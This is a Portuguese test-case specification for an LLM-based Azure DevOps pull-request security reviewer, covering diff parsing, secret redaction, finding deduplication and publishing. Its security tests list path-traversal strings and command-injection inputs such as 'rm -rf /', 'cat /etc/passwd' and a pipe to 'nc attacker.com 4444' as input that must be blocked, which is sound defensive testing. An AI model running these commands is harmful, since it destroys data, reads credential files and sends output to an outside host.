# Test Cases - Azure Code Reviewer

**Versão:** 1.0
**Data:** 2026-01-03
**Relacionado:** [TEST_PLAN.md](TEST_PLAN.md)

---

## 1. CASOS DE TESTE UNITÁRIOS

### TC-U-001: Git Diff Parser - Diff Válido

**Componente:** `git_diff_parser.py`
**Prioridade:** Alta
**Tipo:** Positivo

**Pré-condições:**
- Repositório Git inicializado
- Commit base existente

**Dados de Entrada:**
```diff
diff --git a/app.py b/app.py
index 1234567..abcdefg 100644
--- a/app.py
+++ b/app.py
@@ -10,7 +10,7 @@ def get_user(user_id):
-    query = f"SELECT * FROM users WHERE id = {user_id}"
+    query = "SELECT * FROM users WHERE id = ?"
     return db.execute(query, (user_id,))
```

**Resultado Esperado:**
```python
DiffResult(
    content="diff --git a/app.py...",
    files_changed=["app.py"],
    additions=1,
    deletions=1,
    sanitized=False
)
```

**Implementação:**
```python
def test_parse_valid_diff():
    """TC-U-001: Test parsing valid diff"""
    parser = GitDiffParser()
    result = parser.get_pr_diff()

    assert isinstance(result, DiffResult)
    assert len(result.files_changed) > 0
    assert result.additions >= 0
    assert result.deletions >= 0
```

---

### TC-U-002: Git Diff Parser - Sanitização de API Key

**Componente:** `git_diff_parser.py`
**Prioridade:** Crítica
**Tipo:** Segurança

**Pré-condições:**
- Diff contém API key

**Dados de Entrada:**
```diff
diff --git a/config.py b/config.py
+API_KEY = "sk-ant-1234567890abcdefghijklmnop"
+ANTHROPIC_KEY = "sk-ant-api03-abcdefg"
```

**Resultado Esperado:**
```diff
diff --git a/config.py b/config.py
+API_KEY = "***REDACTED***"
+ANTHROPIC_KEY = "***REDACTED***"
```

**Implementação:**
```python
def test_sanitize_api_key():
    """TC-U-002: Test API key sanitization"""
    diff = 'API_KEY = "sk-ant-1234567890abcdefg"'
    parser = GitDiffParser()
    result = parser._sanitize_secrets(diff)

    assert "sk-ant-" not in result
    assert "***REDACTED***" in result
```

---

### TC-U-003: Git Diff Parser - Sanitização de CPF

**Componente:** `git_diff_parser.py`
**Prioridade:** Alta
**Tipo:** Segurança

**Dados de Entrada:**
```python
user_data = {
    "cpf": "123.456.789-00",
    "cpf_alt": "12345678900"
}
```

**Resultado Esperado:**
```python
user_data = {
    "cpf": "***REDACTED***",
    "cpf_alt": "***REDACTED***"
}
```

**Implementação:**
```python
@pytest.mark.parametrize("cpf_format", [
    "123.456.789-00",
    "12345678900",
    "123-456-789-00"
])
def test_sanitize_cpf(cpf_format):
    """TC-U-003: Test CPF sanitization (multiple formats)"""
    diff = f'cpf = "{cpf_format}"'
    parser = GitDiffParser()
    result = parser._sanitize_secrets(diff)

    assert cpf_format not in result
    assert "***REDACTED***" in result
```

---

### TC-U-004: Markdown Parser - Finding Bem Formatado

**Componente:** `markdown_parser.py`
**Prioridade:** Alta
**Tipo:** Positivo

**Dados de Entrada:**
```markdown
# Vulnerability 1: SQL Injection: `app.py:42`

* Severity: High
* Category: sql_injection
* Description: User input is directly interpolated into SQL query
* Exploit Scenario: Attacker can inject malicious SQL
* Recommendation: Use parameterized queries
* Confidence: 95%
```

**Resultado Esperado:**
```python
Finding(
    agent="sentinel",
    severity="high",
    category="sql_injection",
    title="SQL Injection: app.py:42",
    file_path="app.py",
    line_number=42,
    description="User input is directly interpolated into SQL query",
    exploit_scenario="Attacker can inject malicious SQL",
    recommendation="Use parameterized queries",
    confidence=95
)
```

**Implementação:**
```python
def test_parse_well_formatted_finding():
    """TC-U-004: Test parsing well-formatted finding"""
    markdown = """
# Vulnerability 1: SQL Injection: `app.py:42`

* Severity: High
* Category: sql_injection
* Description: SQL injection vulnerability
* Exploit Scenario: Attack possible
* Recommendation: Use parameterized queries
* Confidence: 95%
"""
    findings = parse_agent_output(markdown, agent="sentinel")

    assert len(findings) == 1
    finding = findings[0]
    assert finding.severity == "high"
    assert finding.file_path == "app.py"
    assert finding.line_number == 42
    assert finding.confidence == 95
```

---

### TC-U-005: Markdown Parser - Múltiplos Findings

**Componente:** `markdown_parser.py`
**Prioridade:** Alta
**Tipo:** Positivo

**Dados de Entrada:**
```markdown
# Vulnerability 1: XSS: `template.html:10`

* Severity: High
* Description: XSS vulnerability

# Vulnerability 2: CSRF: `forms.py:25`

* Severity: Medium
* Description: Missing CSRF token
```

**Resultado Esperado:**
- 2 findings parsed
- Primeira: severity=high, file=template.html
- Segunda: severity=medium, file=forms.py

**Implementação:**
```python
def test_parse_multiple_findings():
    """TC-U-005: Test parsing multiple findings"""
    markdown = """
# Vulnerability 1: XSS: `template.html:10`
* Severity: High

# Vulnerability 2: CSRF: `forms.py:25`
* Severity: Medium
"""
    findings = parse_agent_output(markdown, agent="sentinel")

    assert len(findings) == 2
    assert findings[0].severity == "high"
    assert findings[1].severity == "medium"
```

---

### TC-U-006: Markdown Parser - Markdown Malformado

**Componente:** `markdown_parser.py`
**Prioridade:** Média
**Tipo:** Negativo

**Dados de Entrada:**
```markdown
Vulnerability: XSS
No proper formatting here
Severity is high maybe
```

**Resultado Esperado:**
- Parsing graceful degradation
- Warnings logados
- Retorna lista vazia ou finding parcial

**Implementação:**
```python
def test_parse_malformed_markdown():
    """TC-U-006: Test parsing malformed markdown"""
    markdown = "Vulnerability: XSS\nNo proper format"
    findings = parse_agent_output(markdown, agent="sentinel")

    # Should handle gracefully
    assert isinstance(findings, list)
    # May be empty or contain partial finding with defaults
```

---

### TC-U-007: LLM Client - Chamada Bem-Sucedida

**Componente:** `llm_client.py`
**Prioridade:** Alta
**Tipo:** Positivo

**Pré-condições:**
- API key válida configurada

**Dados de Entrada:**
```python
prompt = "Analyze this code for security issues:\n```python\nquery = f'SELECT * FROM users WHERE id = {user_id}'\n```"
```

**Resultado Esperado:**
```python
LLMResponse(
    content="# Vulnerability 1: SQL Injection...",
    model="claude-sonnet-4-5-20250929",
    usage={"input_tokens": 150, "output_tokens": 200},
    provider="anthropic"
)
```

**Implementação:**
```python
@patch('anthropic.Anthropic')
def test_llm_call_success(mock_anthropic):
    """TC-U-007: Test successful LLM API call"""
    # Mock response
    mock_response = Mock()
    mock_response.content = [Mock(text="# Vulnerability 1: SQL Injection")]
    mock_response.model = "claude-sonnet-4-5-20250929"
    mock_response.usage = Mock(input_tokens=150, output_tokens=200)

    mock_client = Mock()
    mock_client.messages.create.return_value = mock_response
    mock_anthropic.return_value = mock_client

    client = create_llm_client(provider="anthropic", api_key="sk-test")
    response = client.generate("Test prompt")

    assert isinstance(response, LLMResponse)
    assert "Vulnerability" in response.content
    assert response.usage['input_tokens'] == 150
```

---

### TC-U-008: LLM Client - Rate Limit com Retry

**Componente:** `llm_client.py`
**Prioridade:** Alta
**Tipo:** Negativo

**Pré-condições:**
- API retorna 429 (rate limit)

**Comportamento Esperado:**
- 1ª tentativa: 429
- Wait com backoff exponencial
- 2ª tentativa: 200 OK

**Implementação:**
```python
@patch('anthropic.Anthropic')
def test_rate_limit_retry(mock_anthropic):
    """TC-U-008: Test retry on rate limit (429)"""
    from anthropic import RateLimitError

    mock_client = Mock()
    # First call: rate limit
    # Second call: success
    mock_client.messages.create.side_effect = [
        RateLimitError("Rate limit exceeded"),
        Mock(
            content=[Mock(text="Success")],
            model="test-model",
            usage=Mock(input_tokens=100, output_tokens=50)
        )
    ]
    mock_anthropic.return_value = mock_client

    client = create_llm_client(provider="anthropic", api_key="sk-test")
    response = client.generate("Test prompt")

    assert response.content == "Success"
    assert mock_client.messages.create.call_count == 2
```

---

### TC-U-009: Finding Deduplicator - Duplicatas Exatas

**Componente:** `finding_deduplicator.py`
**Prioridade:** Alta
**Tipo:** Positivo

**Dados de Entrada:**
```python
findings = [
    Finding(file_path="app.py", line_number=42, category="sql_injection", severity="high"),
    Finding(file_path="app.py", line_number=42, category="sql_injection", severity="high"),
]
```

**Resultado Esperado:**
- 1 finding (deduplicado)
- Metadata mostra 2 agents encontraram

**Implementação:**
```python
def test_deduplicate_exact_duplicates():
    """TC-U-009: Test deduplication of exact duplicates"""
    finding1 = Finding(
        agent="sentinel",
        file_path="app.py",
        line_number=42,
        category="sql_injection",
        severity="high",
        title="SQL Injection",
        description="Vulnerability"
    )
    finding2 = Finding(
        agent="forge",
        file_path="app.py",
        line_number=42,
        category="sql_injection",
        severity="high",
        title="SQL Injection",
        description="Vulnerability"
    )

    deduplicator = FindingDeduplicator()
    result = deduplicator.deduplicate([finding1, finding2])

    assert len(result) == 1
    assert len(result[0].detected_by) == 2
    assert "sentinel" in result[0].detected_by
    assert "forge" in result[0].detected_by
```

---

### TC-U-010: Finding Deduplicator - Similaridade Alta

**Componente:** `finding_deduplicator.py`
**Prioridade:** Alta
**Tipo:** Positivo

**Dados de Entrada:**
```python
finding1 = Finding(
    description="SQL injection vulnerability in user query",
    ...
)
finding2 = Finding(
    description="SQL injection vuln in user query builder",
    ...
)
# Similaridade: ~85%
```

**Resultado Esperado:**
- Findings mergeados (threshold=80%)
- Description combinada

**Implementação:**
```python
def test_deduplicate_similar_findings():
    """TC-U-010: Test deduplication of similar findings (>80%)"""
    finding1 = Finding(
        agent="sentinel",
        file_path="app.py",
        line_number=42,
        category="sql_injection",
        severity="high",
        title="SQL Injection",
        description="SQL injection vulnerability in user query"
    )
    finding2 = Finding(
        agent="forge",
        file_path="app.py",
        line_number=42,
        category="sql_injection",
        severity="high",
        title="SQL Injection",
        description="SQL injection vuln in user query builder"
    )

    deduplicator = FindingDeduplicator(similarity_threshold=0.80)
    result = deduplicator.deduplicate([finding1, finding2])

    assert len(result) == 1
    # Should merge agents
    assert len(result[0].detected_by) == 2
```

---

## 2. CASOS DE TESTE DE INTEGRAÇÃO

### TC-I-001: Diff → LLM → Findings

**Componente:** Integração completa
**Prioridade:** Crítica
**Tipo:** Positivo

**Fluxo:**
1. Parse diff real
2. Enviar para LLM
3. Parse markdown output
4. Validar findings estruturados

**Implementação:**
```python
@pytest.mark.integration
def test_diff_to_findings_integration():
    """TC-I-001: Test complete flow from diff to findings"""
    # 1. Parse diff
    parser = GitDiffParser()
    diff_result = parser.get_pr_diff()
    assert len(diff_result.files_changed) > 0

    # 2. Run security review (uses real LLM or VCR recording)
    runner = SecurityReviewRunner()
    result = runner.run()

    # 3. Validate findings
    assert "findings" in result
    assert isinstance(result["findings"], list)
    if len(result["findings"]) > 0:
        finding = result["findings"][0]
        assert hasattr(finding, 'severity')
        assert hasattr(finding, 'file_path')
```

---

### TC-I-002: Multi-Agent Deduplicação

**Componente:** Normalizer + Deduplicator
**Prioridade:** Alta
**Tipo:** Positivo

**Cenário:**
- 3 agents encontram mesma vulnerabilidade
- Deduplicador deve consolidar

**Implementação:**
```python
@pytest.mark.integration
def test_multi_agent_deduplication():
    """TC-I-002: Test deduplication across 3 agents"""
    # Simulate 3 agents finding same issue
    security_findings = load_fixture('security_findings.json')
    design_findings = load_fixture('design_findings.json')
    code_findings = load_fixture('code_findings.json')

    normalizer = ResultNormalizer()
    result = normalizer.normalize(
        security_findings,
        design_findings,
        code_findings
    )

    # Verify deduplication
    assert result['metadata']['total_findings'] < (
        len(security_findings) +
        len(design_findings) +
        len(code_findings)
    )
```

---

### TC-I-003: Publisher + Azure DevOps API

**Componente:** PR Publisher + Azure Client
**Prioridade:** Alta
**Tipo:** Integração Externa

**Pré-condições:**
- Azure DevOps test environment configurado
- PAT válido

**Implementação:**
```python
@pytest.mark.integration
@pytest.mark.azure
@pytest.mark.skipif("not config.getoption('--run-azure')")
def test_publish_to_azure_pr():
    """TC-I-003: Test publishing to real Azure DevOps PR"""
    # Load test findings
    findings = load_fixture('normalized_findings.json')

    # Publish
    publisher = PRPublisher(
        org=TEST_ORG,
        project=TEST_PROJECT,
        repo_id=TEST_REPO,
        pr_id=TEST_PR_ID,
        token=TEST_PAT
    )

    result = publisher.publish(findings, threshold='high')

    # Verify
    assert result['summary_thread_created'] is True
    assert result['inline_threads_created'] > 0

    # Cleanup
    cleanup_pr_threads(TEST_PR_ID)
```

---

## 3. CASOS DE TESTE E2E

### TC-E2E-001: Fluxo Completo de Review

**Componente:** Sistema completo
**Prioridade:** Crítica
**Tipo:** Happy Path

**Fluxo:**
1. Mock PR criado com código vulnerável
2. Pipeline triggered
3. 3 agents executam
4. Normalizer consolida
5. Publisher cria threads
6. Validar comentários no PR

**Implementação:**
```python
@pytest.mark.e2e
@pytest.mark.slow
def test_complete_review_flow():
    """TC-E2E-001: Test complete code review flow"""
    # 1. Setup: Create test PR
    pr_id = create_test_pr(
        branch="test/vulnerable-code",
        files=["app_with_sqli.py", "template_with_xss.html"]
    )

    # 2. Execute: Run complete review
    result = run_complete_review(pr_id)

    # 3. Verify: Check results
    assert result['status'] == 'success'
    assert result['findings_count'] > 0

    # 4. Verify: Check Azure DevOps threads
    threads = get_pr_threads(pr_id)
    assert len(threads) > 0

    # Summary thread should exist
    summary = [t for t in threads if t['threadContext'] is None]
    assert len(summary) == 1

    # Inline threads should exist
    inline = [t for t in threads if t['threadContext'] is not None]
    assert len(inline) > 0

    # 5. Cleanup
    cleanup_test_pr(pr_id)
```

---

### TC-E2E-002: PR Sem Mudanças

**Componente:** Sistema completo
**Prioridade:** Média
**Tipo:** Edge Case

**Cenário:**
- PR com diff vazio
- System deve criar summary "no changes"

**Implementação:**
```python
@pytest.mark.e2e
def test_empty_pr():
    """TC-E2E-002: Test PR with no changes"""
    pr_id = create_test_pr(
        branch="test/no-changes",
        files=[]
    )

    result = run_complete_review(pr_id)

    assert result['status'] == 'success'
    assert result['findings_count'] == 0

    threads = get_pr_threads(pr_id)
    summary = threads[0]
    assert "no changes" in summary['content'].lower()

    cleanup_test_pr(pr_id)
```

---

## 4. CASOS DE TESTE DE SEGURANÇA

### TC-S-001: Path Traversal Protection

**Componente:** Path sanitizer
**Prioridade:** Crítica
**Tipo:** Segurança

**Dados de Entrada:**
```python
malicious_paths = [
    "../../../etc/passwd",
    "..\\..\\windows\\system32",
    "%2e%2e%2f",
    "....//....//etc/passwd"
]
```

**Resultado Esperado:**
- Todas as tentativas bloqueadas
- SecurityError raised

**Implementação:**
```python
@pytest.mark.security
@pytest.mark.parametrize("malicious_path", [
    "../../../etc/passwd",
    "..\\..\\windows\\system32",
    "%2e%2e%2f",
    "....//....//etc/passwd",
    "/etc/shadow",
    "C:\\Windows\\System32"
])
def test_path_traversal_blocked(malicious_path):
    """TC-S-001: Test path traversal attempts are blocked"""
    from scripts.utils.path_sanitizer import validate_file_path, SecurityError

    with pytest.raises(SecurityError, match="Path traversal"):
        validate_file_path(malicious_path)
```

---

### TC-S-002: Command Injection Prevention

**Componente:** Git command executor
**Prioridade:** Crítica
**Tipo:** Segurança

**Dados de Entrada:**
```python
malicious_commands = [
    "git status; rm -rf /",
    "git diff && cat /etc/passwd",
    "git log | nc attacker.com 4444"
]
```

**Resultado Esperado:**
- Commands não executados
- SecurityError raised

**Implementação:**
```python
@pytest.mark.security
@pytest.mark.parametrize("malicious_cmd", [
    "git status; rm -rf /",
    "git diff && cat /etc/passwd",
    "git log | nc attacker.com 4444",
    "git branch`whoami`"
])
def test_command_injection_blocked(malicious_cmd):
    """TC-S-002: Test command injection prevention"""
    runner = SecurityReviewRunner()

    result = runner._execute_git_command(malicious_cmd)

    # Should return error message, not execute
    assert "not in whitelist" in result or "invalid command" in result
```

---

### TC-S-003: Secrets Não Vazam em Logs

**Componente:** Logging system
**Prioridade:** Crítica
**Tipo:** Segurança

**Cenário:**
- API keys, PATs devem ser mascarados em logs

**Implementação:**
```python
@pytest.mark.security
def test_secrets_not_in_logs(caplog):
    """TC-S-003: Test secrets are not logged"""
    import logging
    from scripts.utils.llm_client import create_llm_client

    # Create client with real-looking API key
    api_key = "sk-ant-api03-test1234567890abcdefg"

    with caplog.at_level(logging.DEBUG):
        client = create_llm_client(
            provider="anthropic",
            api_key=api_key
        )

    # Check logs don't contain full API key
    log_text = caplog.text
    assert api_key not in log_text
    assert "sk-ant-api03-test1234567890abcdefg" not in log_text
    # Should contain masked version
    assert "sk-ant-***" in log_text or "***REDACTED***" in log_text
```

---

## 5. CASOS DE TESTE DE PERFORMANCE

### TC-P-001: Diff Parsing Performance

**Componente:** Git diff parser
**Prioridade:** Alta
**Tipo:** Performance

**Critério:**
- Diff grande (50 arquivos, 5000 linhas) em < 2s

**Implementação:**
```python
@pytest.mark.performance
def test_diff_parsing_performance():
    """TC-P-001: Test diff parsing completes in < 2s"""
    import time

    # Generate large diff
    large_diff = generate_large_diff(files=50, lines_per_file=100)

    parser = GitDiffParser()

    start = time.time()
    result = parser.parse_diff_content(large_diff)
    elapsed = time.time() - start

    assert elapsed < 2.0, f"Parsing took {elapsed:.2f}s (threshold: 2s)"
    assert len(result.files_changed) == 50
```

---

### TC-P-002: Complete Review Performance

**Componente:** Sistema completo
**Prioridade:** Alta
**Tipo:** Performance

**Critério:**
- Review completo (3 agents) em < 120s

**Implementação:**
```python
@pytest.mark.performance
@pytest.mark.slow
def test_complete_review_performance():
    """TC-P-002: Test complete review in < 120s"""
    import time

    start = time.time()

    result = run_complete_review(
        diff_file="tests/fixtures/diffs/realistic_pr.diff"
    )

    elapsed = time.time() - start

    assert elapsed < 120.0, f"Review took {elapsed:.2f}s (threshold: 120s)"
    assert result['status'] == 'success'

    # Log timing breakdown
    print(f"\nTiming breakdown:")
    print(f"  Security: {result['timing']['security']:.2f}s")
    print(f"  Design: {result['timing']['design']:.2f}s")
    print(f"  Code: {result['timing']['code']:.2f}s")
    print(f"  Normalize: {result['timing']['normalize']:.2f}s")
    print(f"  Publish: {result['timing']['publish']:.2f}s")
```

---

## 6. FIXTURES E HELPERS

### Fixture: Sample Diff

```python
# tests/conftest.py

@pytest.fixture
def sample_vulnerable_diff():
    """Sample diff with SQL injection vulnerability"""
    return """
diff --git a/app.py b/app.py
index 1234567..abcdefg 100644
--- a/app.py
+++ b/app.py
@@ -10,7 +10,7 @@ def get_user(user_id):
-    query = f"SELECT * FROM users WHERE id = {user_id}"
+    # TODO: fix this
+    query = f"SELECT * FROM users WHERE id = {user_id}"
     return db.execute(query)
"""

@pytest.fixture
def sample_clean_diff():
    """Sample diff with no vulnerabilities"""
    return """
diff --git a/utils.py b/utils.py
index 1234567..abcdefg 100644
--- a/utils.py
+++ b/utils.py
@@ -5,6 +5,7 @@ def format_date(date):
+    # Added timezone support
     return date.isoformat()
"""
```

### Helper: Generate Large Diff

```python
# tests/helpers.py

def generate_large_diff(files=50, lines_per_file=100):
    """Generate large diff for performance testing"""
    diff_parts = []

    for i in range(files):
        diff_parts.append(f"diff --git a/file{i}.py b/file{i}.py")
        diff_parts.append(f"index {i:07d}..{i+1:07d} 100644")
        diff_parts.append(f"--- a/file{i}.py")
        diff_parts.append(f"+++ b/file{i}.py")

        for j in range(lines_per_file):
            if j % 2 == 0:
                diff_parts.append(f"+    line {j}")
            else:
                diff_parts.append(f"-    old line {j}")

    return "\n".join(diff_parts)
```

---

## 7. EXECUÇÃO E RELATÓRIOS

### Comando Completo

```bash
# Executar todos os casos de teste
pytest tests/ \
  --cov=scripts \
  --cov-report=html \
  --cov-report=term-missing \
  -v \
  --tb=short \
  --maxfail=5

# Executar apenas casos críticos
pytest tests/ -v -m "priority_critical"

# Executar com report JUnit (CI/CD)
pytest tests/ \
  --junitxml=test-results.xml \
  --cov-report=xml
```

### Markers Customizados

```python
# pytest.ini

[pytest]
markers =
    unit: Unit tests
    integration: Integration tests
    e2e: End-to-end tests
    security: Security tests
    performance: Performance tests
    slow: Slow tests (> 5s)
    azure: Tests requiring Azure DevOps
    priority_critical: Critical priority tests
    priority_high: High priority tests
    priority_medium: Medium priority tests
```

---

**Total de Casos de Teste:** 60+
**Cobertura Esperada:** 85%+
**Tempo de Execução:** < 5 minutos (exceto E2E)